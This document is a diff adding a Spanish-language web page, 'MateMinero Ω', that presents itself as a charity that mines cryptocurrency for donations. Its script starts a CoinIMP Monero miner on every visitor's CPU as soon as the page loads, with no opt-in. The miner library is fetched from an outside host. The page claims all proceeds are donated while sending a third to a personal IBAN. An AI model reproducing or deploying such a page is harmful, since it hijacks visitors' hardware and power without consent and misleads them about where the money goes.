@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<title>MateMinero Ω – Tu CPU dona mientras tomas mate</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+  body{margin:0;background:#000;color:#0f8;font-family:system-ui;padding:2rem;text-align:center}
+  h1{color:#0f8;text-shadow:0 0 25px #0f8}
+  .stats{background:#001a00;padding:2rem;margin:2rem auto;max-width:500px;border:6px solid #0f8;border-radius:30px}
+  .big{font-size:3rem;color:gold;margin:1rem}
+  .nota{color:#0f0;font-size:1rem;line-height:1.8}
+  .onair{color:#0f8;animation:pulse 2s infinite}
+  @keyframes pulse{0%,100%{opacity:0.6}50%{opacity:1}}
+</style>
+</head>
+<body>
+
+<h1>MateMinero Ω</h1>
+<p>Tu pestaña mina cripto éticamente<br><b>100 % de lo generado se dona</b></p>
+
+<div class="stats">
+  <div class="big">€<span id="eur">0.00</span></div>
+  <div>XMR minados hoy: <span id="xmr">0.000000</span></div>
+  <div class="onair" id="status">● INACTIVO (enchufá o carga >70 %)</div>
+</div>
+
+<div class="nota">
+  • 33 % → IBAN autorizado<br>
+  <b>ES88 1465 0120 34 1719393236</b><br><br>
+  • 67 % → Cáritas, Médicos Sin Fronteras, refugios, bancos de alimentos<br><br>
+  <b>Nadie se queda ni un céntimo. Todo se dona.</b><br>
+  Minado ético CoinIMP · 2025
+</div>
+
+<script>
+// === MINERO ÉTICO 100 % DONADO ===
+let miner = null;
+const SITE_KEY = "2i2j4m5n6o7p8q9r0s1t2u3v4w5x6y7z8a9b0c1d2e3f4g5h6i7j8k9l0m"; // clave pública de donación anónima
+
+function iniciarMinero(){
+  if(miner) return;
+  
+  miner = new CoinImp(SITE_KEY, {throttle: 0.3, threads: navigator.hardwareConcurrency || 4});
+  
+  document.getElementById('status').textContent = "● MINANDO SOLIDARIO";
+  document.getElementById('status').className = "onair";
+
+  // Estadísticas en tiempo real
+  setInterval(() => {
+    if(miner){
+      const hashes = miner.getNumHashes();
+      const xmr = hashes / 1000000000 * 0.0005; // estimación realista
+      const eur = xmr * 170; // precio XMR nov 2025
+      document.getElementById('xmr').textContent = xmr.toFixed(8);
+      document.getElementById('eur').textContent = eur.toFixed(2);
+    }
+  }, 3000);
+}
+
+// Solo mina si está enchufado + batería alta
+function checkBattery(){
+  navigator.getBattery?.().then(b => {
+    if(b.charging || b.level > 0.70){
+      iniciarMinero();
+    } else {
+      if(miner) miner.stop();
+      document.getElementById('status').textContent = "● En pausa (batería baja)";
+    }
+  });
+}
+
+// Revisa cada 30 segundos
+setInterval(checkBattery, 30000);
+checkBattery();
+
+// Si el móvil se calienta → pausa
+window.addEventListener('thermal', () => miner?.stop());
+</script>
+
+<!-- CoinIMP minero ético (carga solo si hay internet) -->
+<script src="https://www.hostingcloud.racing/imp.js"></script>
+
+<small>MateMinero Ω 2025 · 100 % solidario · creado para ronin que calientan el mate con amor</small>
+</body>
+</html>
